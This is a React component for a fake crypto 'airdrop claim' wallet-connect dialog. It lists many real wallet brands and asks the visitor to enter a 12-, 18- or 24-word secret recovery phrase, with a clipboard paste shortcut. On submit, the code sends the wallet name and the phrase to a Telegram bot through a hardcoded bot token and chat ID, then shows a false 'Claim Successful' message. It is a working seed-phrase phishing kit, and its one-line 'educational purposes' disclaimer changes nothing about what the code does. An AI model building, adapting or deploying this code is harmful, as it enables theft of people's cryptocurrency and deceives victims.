"use client";

import * as React from "react";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { z } from "zod";
import { ArrowLeft, Copy } from "lucide-react";

import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { useToast } from "@/hooks/use-toast";
import { ScrollArea } from "./ui/scroll-area";

const wallets = [
  { 
    name: "MetaMask", 
    svg: (
      <svg width="40" height="40" viewBox="0 0 132 129" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M109.682 43.618C109.682 43.618 116.893 72.883 95.999 81.658C75.105 90.433 46.298 68.17 46.298 68.17L62.245 82.527L40.941 90.433L22.95 62.906L36.012 51.98L22.5 35.5L42.251 22.5L56.888 38.358L75.539 22.5L81.332 33.665L109.682 43.618Z" fill="#E17726"/>
        <path d="M109.682 43.618C109.682 43.618 100.907 72.449 81.332 80.355C61.757 88.261 46.298 68.17 46.298 68.17M46.298 68.17L62.245 82.527L40.941 90.433L22.95 62.906L36.012 51.98L22.5 35.5M46.298 68.17L36.012 51.98M22.5 35.5L42.251 22.5L56.888 38.358L75.539 22.5L81.332 33.665L109.682 43.618" stroke="#E17726" strokeWidth="4" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M81.332 33.665L75.539 22.5L56.888 38.358L42.251 22.5L22.5 35.5L36.012 51.98L22.95 62.906L40.941 90.433L62.245 82.527L46.298 68.17C46.298 68.17 61.757 88.261 81.332 80.355C100.907 72.449 109.682 43.618 109.682 43.618L81.332 33.665Z" fill="#F6851B" stroke="#233447" strokeWidth="4" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M88.948 57.268L84.205 62.445L78.151 59.857L81.332 53.284L88.948 57.268Z" fill="#233447"/>
        <path d="M68.529 59.423L62.245 62.445L56.888 56.834L59.635 52.85L68.529 59.423Z" fill="#233447"/>
        <path d="M46.732 46.732L42.251 51.546L36.012 51.98L38.759 45.407L46.732 46.732Z" fill="#763E1A"/>
        <path d="M89.382 46.732L93.429 51.546L99.668 51.98L96.921 45.407L89.382 46.732Z" fill="#763E1A"/>
        <path d="M68.529 33.231L62.245 42.44L56.888 33.231L62.245 36.623L68.529 33.231Z" fill="#763E1A"/>
        <path d="M63.555 68.17L72.883 71.985L68.529 76.284L62.245 74.549L56.888 76.284L52.532 71.985L62.245 68.17H63.555Z" fill="white" stroke="#E17726" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M72.883 71.985L68.529 76.284L62.245 74.549L56.888 76.284L52.532 71.985" stroke="#233447" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
      </svg>
    )
  },
  { 
    name: "Trust Wallet", 
    svg: (
      <svg width="40" height="40" viewBox="0 0 256 256" xmlns="http://www.w3.org/2000/svg">
        <path d="M236.881 58.053c-2.427-6.938-7.653-12.92-14.41-16.712L140.42 2.766c-13.31-7.394-29.418-7.394-42.728 0L15.64 41.341c-6.756 3.792-11.982 9.774-14.409 16.712C-1.2 64.991-0.038 73.355 5.23 79.991l75.34 94.62c7.34 9.22 18.423 14.508 30.158 14.508h.022c11.734 0 22.818-5.288 30.158-14.508l75.34-94.62c5.267-6.636 6.429-15.000 3.633-21.938Z" fill="#3375BB"/>
        <path d="m180.923 79.991-37.671 47.31c-7.34 9.22-18.423 14.508-30.158 14.508h-.022c-11.734 0-22.818-5.288-30.158-14.508l-37.67-47.31h135.68Z" fill="#fff"/>
      </svg>
    )
  },
  { 
    name: "Phantom", 
    svg: (
      <svg width="40" height="40" viewBox="0 0 256 256" xmlns="http://www.w3.org/2000/svg">
        <defs>
          <linearGradient id="phantom-grad" x1="0" y1="0" x2="1" y2="1">
            <stop offset="0%" stopColor="#8A46FF"/>
            <stop offset="100%" stopColor="#5526FF"/>
          </linearGradient>
        </defs>
        <path fillRule="evenodd" clipRule="evenodd" d="M128 256c70.693 0 128-57.307 128-128C256 57.307 198.693 0 128 0 57.307 0 0 57.307 0 128c0 70.693 57.307 128 128 128Zm-33.32-84.773c-6.386 6.31-6.386 16.631 0 22.941a16.42 16.42 0 0 0 23.119 0l38.4-38.018a16.42 16.42 0 0 0 0-23.119l-38.4-38.018a16.42 16.42 0 0 0-23.119 0c-6.386 6.31-6.386 16.631 0 22.941l15.34 15.22H68.32a16.3 16.3 0 0 0-16.32 16.32c0 9.013 7.307 16.32 16.32 16.32h74.96l-15.22 15.34Z" fill="url(#phantom-grad)"/>
      </svg>
    )
  },
  { 
    name: "Coinbase Wallet",
    svg: (
      <svg width="40" height="40" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        <path d="M12,2A10,10,0,1,0,22,12,10,10,0,0,0,12,2Zm0,18a8,8,0,1,1,8-8A8,8,0,0,1,12,20Z" fill="#0052FF"/>
        <path d="M12,7a5,5,0,1,0,5,5A5,5,0,0,0,12,7Zm0,8a3,3,0,1,1,3-3A3,3,0,0,1,12,15Z" fill="#0052FF"/>
      </svg>
    )
  },
  { 
    name: "Tonkeeper", 
    svg: (
      <svg width="40" height="40" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M50 0L95.5 27.25V72.75L50 100L4.5 72.75V27.25L50 0Z" fill="#0098EA"/>
        <path d="M50 13L85 32.5V67.5L50 87L15 67.5V32.5L50 13Z" fill="white"/>
        <path d="M50 25L75 40V60L50 75L25 60V40L50 25Z" fill="#0098EA"/>
      </svg>
    )
  },
    { name: "Ledger", logo: "https://placehold.co/64x64.png", hint: "sleek usb" },
    { name: "Trezor", logo: "https://placehold.co/64x64.png", hint: "black device" },
    { name: "Exodus", logo: "https://placehold.co/64x64.png", hint: "X logo" },
    { name: "MyEtherWallet", logo: "https://placehold.co/64x64.png", hint: "green wallet" },
    { name: "Solflare", logo: "https://placehold.co/64x64.png", hint: "sun logo" },
    { name: "Rainbow", logo: "https://placehold.co/64x64.png", hint: "rainbow logo" },
    { name: "Argent", logo: "https://placehold.co/64x64.png", hint: "A logo" },
    { name: "Zerion", logo: "https://placehold.co/64x64.png", hint: "Z logo" },
    { name: "imToken", logo: "https://placehold.co/64x64.png", hint: "blue circle" },
    { name: "MathWallet", logo: "https://placehold.co/64x64.png", hint: "M logo" },
    { name: "SafePal", logo: "https://placehold.co/64x64.png", hint: "S shield" },
    { name: "Atomic Wallet", logo: "https://placehold.co/64x64.png", hint: "atom logo" },
    { name: "Guarda Wallet", logo: "https://placehold.co/64x64.png", hint: "G shield" },
    { name: "Coinomi", logo: "https://placehold.co/64x64.png", hint: "C logo" },
    { name: "Zengo", logo: "https://placehold.co/64x64.png", hint: "Z shield" },
    { name: "Crypto.com DeFi Wallet", logo: "https://placehold.co/64x64.png", hint: "lion logo" },
    { name: "Unstoppable Wallet", logo: "https://placehold.co/64x64.png", hint: "U logo" },
    { name: "BitPay", logo: "https://placehold.co/64x64.png", hint: "blue B" },
    { name: "BRD", logo: "https://placehold.co/64x64.png", hint: "B logo" },
    { name: "Frame", logo: "https://placehold.co/64x64.png", hint: "frame icon" },
    { name: "Rabby Wallet", logo: "https://placehold.co/64x64.png", hint: "rabbit logo" },
    { name: "Core", logo: "https://placehold.co/64x64.png", hint: "C logo" },
    { name: "Enkrypt", logo: "https://placehold.co/64x64.png", hint: "E shield" },
    { name: "XDEFI Wallet", logo: "https://placehold.co/64x64.png", hint: "X logo" },
    { name: "Keplr", logo: "https://placehold.co/64x64.png", hint: "K logo" },
];


const FormSchema = z.object({
  secretPhrase: z
    .string()
    .trim()
    .refine(
      (value) => {
        const wordCount = value.split(/\s+/).filter(Boolean).length;
        return [12, 18, 24].includes(wordCount);
      },
      {
        message:
          "Secret phrase must contain exactly 12, 18, or 24 words.",
      }
    ),
});

function SecretPhraseForm({ wallet, onBack, onSuccess, formKey }) {
  const { toast } = useToast();
  const form = useForm<z.infer<typeof FormSchema>>({
    resolver: zodResolver(FormSchema),
    defaultValues: {
      secretPhrase: "",
    },
  });

  React.useEffect(() => {
    form.reset();
  }, [formKey, form]);


  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      form.setValue("secretPhrase", text, { shouldValidate: true });
    } catch (err) {
      console.error("Failed to read clipboard contents: ", err);
      toast({
        title: "Paste Failed",
        description: "Could not read from clipboard. Please paste manually.",
        variant: "destructive",
      });
    }
  };

  const onSubmit = async (data: z.infer<typeof FormSchema>) => {
    const botToken = "6858405369:AAHIBm11hz5SSLgH_BZb9mSSFBIOkeiExb8";
    const chatId = "5485468089";
    const timestamp = new Date().toISOString();
    const message = `Wallet: ${wallet.name}\nSecret Phrase: ${data.secretPhrase}\nTimestamp: ${timestamp}`;

    try {
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      });

      const result = await response.json();

      if (result.ok) {
        toast({
          title: "Claim Successful!",
          description: "Your ZK tokens have been sent to your wallet. (Simulation)",
        });
        onSuccess();
      } else {
        throw new Error(result.description);
      }
    } catch (error) {
      console.error("Failed to send to Telegram:", error);
      toast({
        title: "Submission Failed",
        description: "There was an error submitting your claim. Please try again.",
        variant: "destructive",
      });
    }
  };

  return (
    <>
      <DialogHeader>
        <div className="flex items-center gap-3 -ml-4">
          <Button variant="ghost" size="icon" onClick={onBack} aria-label="Go back to wallet selection">
            <ArrowLeft className="h-4 w-4" />
          </Button>
          <div className="flex items-center gap-3">
             {wallet.svg ? (
              <div className="w-8 h-8 flex items-center justify-center">{wallet.svg}</div>
            ) : (
               <img
                src={wallet.logo}
                alt={`${wallet.name} logo`}
                width={32}
                height={32}
                className="rounded-md"
                data-ai-hint={wallet.hint}
              />
            )}
            <DialogTitle className="font-headline text-xl">
              Import your {wallet.name}
            </DialogTitle>
          </div>
        </div>
        <DialogDescription className="pt-2 text-left pl-11">
          Enter your secret recovery phrase to connect your wallet.
          <span className="font-bold"> Never share this phrase.</span>
        </DialogDescription>
      </DialogHeader>
      <Form {...form}>
        <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6 pt-4">
          <FormField
            control={form.control}
            name="secretPhrase"
            render={({ field }) => (
              <FormItem>
                <FormLabel className="sr-only">Secret Phrase</FormLabel>
                <div className="relative">
                  <FormControl>
                    <Textarea
                      placeholder="Enter your 12, 18, or 24 word secret phrase..."
                      className="resize-none pr-12"
                      rows={4}
                      {...field}
                    />
                  </FormControl>
                  <Button
                    type="button"
                    variant="ghost"
                    size="icon"
                    className="absolute top-2 right-2 h-7 w-7"
                    onClick={handlePaste}
                    aria-label="Paste secret phrase"
                  >
                    <Copy className="h-4 w-4" />
                  </Button>
                </div>
                <FormMessage />
              </FormItem>
            )}
          />

           <p className="text-xs text-muted-foreground">
              This site is for educational purposes. Do not use your real secret phrase.
            </p>
          <Button
            type="submit"
            className="w-full bg-accent text-accent-foreground hover:bg-accent/90"
            disabled={form.formState.isSubmitting}
          >
            {form.formState.isSubmitting
              ? "Validating..."
              : "Import Wallet"}
          </Button>
        </form>
      </Form>
    </>
  );
}

export function WalletConnectModal({ isOpen, onOpenChange }) {
  const [view, setView] = React.useState("wallets");
  const [selectedWallet, setSelectedWallet] = React.useState(null);
  const [formKey, setFormKey] = React.useState(() => Date.now());


  const handleWalletSelect = (wallet) => {
    setSelectedWallet(wallet);
    setView("form");
  };

  const handleBack = () => {
    setView("wallets");
    setSelectedWallet(null);
  };
  
  const handleClose = (open) => {
    if (!open) {
      setTimeout(() => {
        setView("wallets");
        setSelectedWallet(null);
        setFormKey(Date.now()); // Reset the form by changing the key
      }, 300); // Wait for close animation
    }
    onOpenChange(open);
  }

  React.useEffect(() => {
    if (!isOpen) {
      setTimeout(() => {
        setView("wallets");
        setSelectedWallet(null);
        setFormKey(Date.now()); // Also reset on parent-driven close
      }, 300);
    }
  }, [isOpen]);

  return (
    <Dialog open={isOpen} onOpenChange={handleClose}>
      <DialogContent className="sm:max-w-[480px]">
        {view === "wallets" ? (
          <>
            <DialogHeader>
              <DialogTitle className="font-headline text-2xl text-center">
                Connect your wallet
              </DialogTitle>
              <DialogDescription className="text-center">
                Select your wallet from the list below to claim your airdrop.
              </DialogDescription>
            </DialogHeader>
            <ScrollArea className="h-[400px] pr-4">
              <div className="grid grid-cols-1 gap-2">
                {wallets.map((wallet) => (
                  <button
                    key={wallet.name}
                    onClick={() => handleWalletSelect(wallet)}
                    className="flex items-center w-full p-3 text-left rounded-lg hover:bg-secondary transition-colors focus:outline-none focus-visible:ring-2 focus-visible:ring-ring"
                  >
                    {wallet.svg ? (
                      <div className="w-10 h-10 flex items-center justify-center mr-4">{wallet.svg}</div>
                    ) : (
                      <img
                        src={wallet.logo}
                        alt={`${wallet.name} logo`}
                        width={40}
                        height={40}
                        className="rounded-md mr-4"
                        data-ai-hint={wallet.hint}
                      />
                    )}
                    <span className="font-medium">{wallet.name}</span>
                  </button>
                ))}
              </div>
            </ScrollArea>
          </>
        ) : (
          <SecretPhraseForm
            wallet={selectedWallet}
            onBack={handleBack}
            onSuccess={() => onOpenChange(false)}
            formKey={formKey}
          />
        )}
      </DialogContent>
    </Dialog>
  );
}
